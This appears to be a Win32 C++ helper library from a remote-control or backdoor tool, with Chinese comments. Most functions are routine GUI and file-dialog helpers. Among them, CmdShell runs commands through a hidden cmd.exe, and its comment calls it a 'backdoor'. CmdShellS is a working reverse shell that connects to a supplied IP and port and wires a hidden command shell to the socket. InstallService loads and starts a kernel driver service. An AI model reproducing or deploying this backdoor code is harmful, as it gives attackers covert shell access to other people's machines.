//功能：向编辑框控件末尾添加文本
//参数1：编辑框句柄
//参数2：字符串指针
//参数3：添加后是否换行
BOOL AddTextToEdit(HWND hEdit,char *szTxt,BOOL bNextLine)
{
	static char NextLine[]={13,10,0};

	SendMessage(hEdit,EM_SETSEL,-2,-1);
	SendMessage(hEdit,EM_REPLACESEL,0,(long)szTxt);
	if(bNextLine)
		SendMessage(hEdit,EM_REPLACESEL,0,(long)NextLine);
	return 1;
}
//功能：执行CMD命令（单管道后门，执行一次性的命令立即结束进程）
//参数1：命令字符串指针
//参数2：指定一个缓冲区存放回显的内容
//返回值：回显的字节数
int CmdShell(char *command,char *pOutBuf)
{
	char szBuf[5*1024];
	char str[256];
	STARTUPINFO si;
	SECURITY_ATTRIBUTES sa;
	PROCESS_INFORMATION pi;
	HANDLE hRead,hWrite;
	DWORD dwRead,Count=0;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	//创建匿名管道接收cmd的输出
	if(!CreatePipe(&hRead,&hWrite,&sa,0))
		MessageBox(NULL,"管道创建失败","Message",MB_OK);

	//获得系统目录
	GetSystemDirectory(szBuf,256);
	lstrcat(szBuf,"\\cmd.exe /c ");
	lstrcat(szBuf,command);

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si); 
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	CreateProcess(NULL,szBuf,NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);

	//这一句一定要放在读管道之前，否则在读完之前readfile不会返回
	//TMD这个bug浪费了我一下午的时间|||
	CloseHandle(hWrite);
	//循环监视管道里的返回信息
	szBuf[0]=0;
	szBuf[1]=0;
	if (!pOutBuf)//pOutBuf为NULL指明不用填写回显
		return 0;
	while(1)
	{
		//ReadFile(hRead,rBuffer,1024,&dwRead,NULL)
		ReadFile(hRead,str,255,&dwRead,NULL);
		if(dwRead)
		{
			Count+=dwRead;
			str[dwRead]=0;
			str[dwRead+1]=0;				//管道里的字符串最后不填0，自己填上
			lstrcat(szBuf,str);
			continue;
		}
		else
			break;
	}
	lstrcpy(pOutBuf,szBuf);
	pOutBuf[Count+1]=0;
	pOutBuf[Count+2]=0;
	CloseHandle(hRead);

	return lstrlen(szBuf);
}

//零管道，输入输出直接和Socket相连
//参数1：IP地址字符串
//参数2：端口号
//参数3：进程句柄的指针，函数在这里返回cmd进程的句柄
//返回值：创建的套接字
SOCKET CmdShellS(char *szIPAdrees,int Port,HANDLE *hProcess)
{
	char szBuf[5*1024];
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	WSADATA wsaData;
	if(WSAStartup(MAKEWORD(2,2),&wsaData))
		MessageBox(NULL,"初始化失败","Message",MB_OK);
	SOCKET sClient = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL,0,0);
	if(sClient == INVALID_SOCKET)
	{
		MessageBox(NULL,"套接字建立失败","Message",MB_OK);
	}
	// 在sockaddr_in结构中装入服务器端地址信息
	sockaddr_in servAddr;
	servAddr.sin_family = AF_INET;
	servAddr.sin_port = htons(Port);
	servAddr.sin_addr.S_un.S_addr =inet_addr(szIPAdrees);//服务器端ip
	//连接服务器端
	connect(sClient,(sockaddr*)&servAddr,sizeof(servAddr));

	//获得系统目录
	GetSystemDirectory(szBuf,256);
	lstrcat(szBuf,"\\cmd.exe");

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si); 
	si.hStdError=(void *)sClient;
	si.hStdInput=(void *)sClient;
	si.hStdOutput =(void *)sClient;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	CreateProcess(NULL,szBuf,NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);
	(*hProcess)=pi.hProcess;

	return sClient;
} 
//功能：根据文件名获得扩展文件名 字符串处理
//参数1：源文件名
//参数2：文件扩展名的缓冲区指针
void GetFileTypeSz(char *pszFile,char *pszExp)
{
	char *p;
	p=pszFile;
	while((*p)!='.')
	{
		p++;
		if(*p==0)
			return;
	}
	p++;
	lstrcpy(pszExp,p);
	GetFileTypeSz(p,pszExp);//递归调用，找出最后一个扩展名
}
//为列表视图控件添加一个项目/子项目
//参数1：列表视图控件句柄
//参数2：添加的项目的索引号（行）
//参数3：添加的子项目的索引号（列）
//参数4：项目文本
BOOL AddListVeiwItem(HWND hList,int ItemIndex,int SubItemIndex,char *pszText)
{
	char str[MAX_PATH]={0};
	LVITEM lvi;
	ZeroMemory(&lvi,sizeof(lvi));
	lvi.mask=LVIF_TEXT;
	lvi.iItem=ItemIndex;
	lvi.cchTextMax=MAX_PATH;

	lvi.pszText=pszText;
	lvi.iSubItem=SubItemIndex;
	return SendMessage(hList,LVM_INSERTITEM,0,(long)&lvi);
}
//编辑列表视图控件的一个项目/子项目
//参数同AddListVeiwItem
BOOL SetListVeiwItem(HWND hList,int ItemIndex,int SubItemIndex,char *pszText)
{
	char str[MAX_PATH]={0};
	LVITEM lvi;
	ZeroMemory(&lvi,sizeof(lvi));
	lvi.mask=LVIF_TEXT;
	lvi.iItem=ItemIndex;
	lvi.cchTextMax=MAX_PATH;

	lvi.pszText=pszText;
	lvi.iSubItem=SubItemIndex;
	return SendMessage(hList,LVM_SETITEM,0,(long)&lvi);
}
//给树形视图控件的一个项目添加子项目
void AddChildItem(HWND hTree,HTREEITEM hParent,char *pszText)
{
	TVINSERTSTRUCT ti;
	ZeroMemory(&ti,sizeof(ti));
	ti.item.mask=TVIF_TEXT|TVIF_HANDLE;
	ti.hParent=hParent;
	ti.hInsertAfter =TVI_LAST;
	ti.item.pszText=pszText;

	SendMessage(hTree,TVM_INSERTITEM,0,(long)&ti);
}
//得到树形视图控件一个项目的文本
int GetTreeItemText(HWND hTree,HTREEITEM hItem,char *pszText)
{
	TVITEMEX tvi;
	tvi.mask=TVIF_TEXT|TVIF_HANDLE;
	tvi.hItem=hItem;
	tvi.pszText=pszText;
	tvi.cchTextMax=MAX_PATH;
	int b;

	b=TreeView_GetItem(hTree,&tvi);
	//SendMessage(hTree,TVM_GETITEM,0,(long)&tvi);
	return lstrlen(pszText);
}
//清空树形视图控件某一项目的子项目
void CleanTreeItem(HWND hTree,HTREEITEM hPItem)
{
	HTREEITEM hItem;
	
a:	hItem=(HTREEITEM)SendMessage(hTree,TVM_GETNEXTITEM,TVGN_CHILD,(long)hPItem);
	if(hItem)
	{
		SendMessage(hTree,TVM_DELETEITEM,0,(long)hItem);
		goto a;
	}
}
//清空列表视图控件的项目
void CleanListItem(HWND hList)
{
	SendMessage(hList,LVM_DELETEALLITEMS,0,0);
}
//把列表视图控件的各级项目文本用“/”连接成路径的形式
int GetWholePath(HWND hTree,HTREEITEM hCurSel,char *pszPath)
{ 
	int nPathLen=0;
	char szBuf[MAX_PATH]={0};
	HTREEITEM hParent;

	//本条目的加上子条目的文本
	nPathLen+=GetTreeItemText(hTree,hCurSel,szBuf);
	lstrcat(szBuf,"\\");
	lstrcat(szBuf,pszPath);
	lstrcpy(pszPath,szBuf);
	hParent=(HTREEITEM)SendMessage(hTree,TVM_GETNEXTITEM,TVGN_PARENT,(long)hCurSel);
	if(hParent)
	{		
		//递归调用
		nPathLen+=GetWholePath(hTree,hParent,pszPath);
	}		
	return nPathLen+1;
}
//"打开文件"对话框
//参数1：父窗口
//参数2：过滤文件类型字串
//参数3：返回文件全路径名
BOOL OpenFileDlg(HWND hWnd,char *szFilter,char *pszFile)
{
	OPENFILENAME of;

	ZeroMemory(&of,sizeof(of));
	ZeroMemory(pszFile,MAX_PATH);
	of.lStructSize=sizeof(of);
	of.hwndOwner=hWnd;
	of.lpstrFilter=szFilter;
	of.lpstrFile=pszFile;
	of.nMaxFile=MAX_PATH;
	of.Flags=OFN_FILEMUSTEXIST|OFN_PATHMUSTEXIST;
	return GetOpenFileName(&of);
}

//加载服务（驱动）
//参数1：服务（驱动）名称
//参数2：可执行文件位置
//参数3：加载同时是否启动
bool InstallService(char *szDriver,char *szFile,bool bStart)
{
   SC_HANDLE sh=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
   if(!sh)return false;
   SC_HANDLE rh=CreateService(sh,szDriver,szDriver,SERVICE_ALL_ACCESS,
                                                   SERVICE_KERNEL_DRIVER,
                                                   SERVICE_DEMAND_START,
                                                   SERVICE_ERROR_NORMAL,
                                                   szFile,NULL,NULL,NULL,
                                                   NULL,NULL);
   if(!rh)
   {
     if(GetLastError()==ERROR_SERVICE_EXISTS)
     {
        //服务已安装的情况
        rh=OpenService(sh,szDriver,SERVICE_ALL_ACCESS);
        if(!rh)
        {
          CloseServiceHandle(sh);
          return false;
        }
     }
     else
     {
        CloseServiceHandle(sh);
        return false;
     }
   }
   if(bStart)                //是否要启动服务
     StartService(rh,0,NULL);
   CloseServiceHandle(sh);
   CloseServiceHandle(rh);
   return true;
}
//卸载服务（驱动）
//参数：服务（驱动）名称
bool UnInstall(char *szService)
{
   SC_HANDLE sh=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
   if(!sh)return false;
   SC_HANDLE rh=OpenService(sh,szService,SERVICE_ALL_ACCESS);
   if(DeleteService(rh))return true;
   return false;
}
















